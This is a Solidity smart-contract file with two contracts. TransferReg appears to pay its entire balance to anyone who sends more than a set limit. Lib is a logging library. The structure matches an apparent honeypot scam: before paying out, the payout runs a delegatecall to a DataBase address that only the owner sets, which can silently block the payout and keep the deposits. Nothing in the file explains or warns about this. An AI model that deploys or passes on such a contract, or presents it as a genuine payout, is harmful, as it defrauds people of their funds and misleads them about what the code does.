1 pragma solidity ^0.4.18;
2 
3 
4 contract TransferReg
5 {
6     address public Owner = msg.sender;
7     address public DataBase;
8     uint256 public Limit;
9     
10     function Set(address dataBase, uint256 limit)
11     {
12         require(msg.sender == Owner);
13         Limit = limit;
14         DataBase = dataBase;
15     }
16     
17     function()payable{}
18     
19     function transfer(address adr)
20     payable
21     {
22         if(msg.value>Limit)
23         {        
24             DataBase.delegatecall(bytes4(sha3("AddToDB(address)")),msg.sender);
25             adr.transfer(this.balance);
26         }
27     }
28     
29 }
30 
31 contract Lib
32 {
33     address owner = msg.sender;
34     
35     bytes lastUknownMessage;
36     
37     mapping (address => uint256) Db;
38 
39     function() public payable 
40     {
41         lastUknownMessage = msg.data;
42     }
43     
44     function AddToDB(address adr)
45     public
46     payable
47     {
48         Db[adr]++;
49     }
50     
51     function GetAddrCallQty(address adr)
52     public 
53     returns(uint)
54     {
55         require(owner==msg.sender);
56         return Db[adr];
57     }
58     
59     function GetLastMsg()
60     public 
61     returns(bytes)
62     {
63         require(owner==msg.sender);
64         return lastUknownMessage;
65     }
66     
67     
68 }